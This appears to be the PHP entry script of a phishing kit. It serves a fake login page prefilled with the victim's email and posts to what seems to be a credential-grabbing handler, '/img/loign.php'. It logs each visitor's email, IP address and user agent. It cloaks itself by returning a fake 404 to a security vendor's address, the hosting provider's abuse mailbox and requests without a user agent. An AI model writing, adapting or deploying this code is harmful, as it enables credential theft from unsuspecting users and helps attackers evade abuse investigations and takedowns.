<?php
$ua = $_SERVER['HTTP_USER_AGENT'];
if($_GET['mail']=="redacted@threatwave.com") {
	$fp = fopen("ss.txt","a");
    fwrite($fp,"[DETECTED EMPTY MAIL]\n");
    fclose($fp);
	http_response_code(404);
	echo "404 Not Found";
	die();
}
if($_GET['mail']=="redacted@web.de") {
	$fp = fopen("ss.txt","a");
    fwrite($fp,"[DETECTED EMPTY MAIL]\n");
    fclose($fp);
	http_response_code(404);
	echo "404 Not Found";
	die();
}
if($_GET['mail']=="abuse@ionos.com") {
	$fp = fopen("ss.txt","a");
    fwrite($fp,"[DETECTED EMPTY MAIL]\n");
    fclose($fp);
	http_response_code(404);
	echo "404 Not Found";
	die();
}
if($ua == "") {
	$fp = fopen("ss.txt","a");
    fwrite($fp,"[DETECTED ROBOT]\n");
    fclose($fp);
	http_response_code(404);
	echo "404 Not Found";
	die();
}
$mail = $_GET['mail'];
$fp = fopen("visitedssss.txt","a");
fwrite($fp,$mail . " - " . $_SERVER['REMOTE_ADDR']. " - ".$_SERVER['HTTP_USER_AGENT']. "\n");

fclose($fp);
$html = str_replace(array('<grabberurl>','<mailget>'),array('/img/loign.php',$mail),file_get_contents('loign.html'));
echo $html;
?>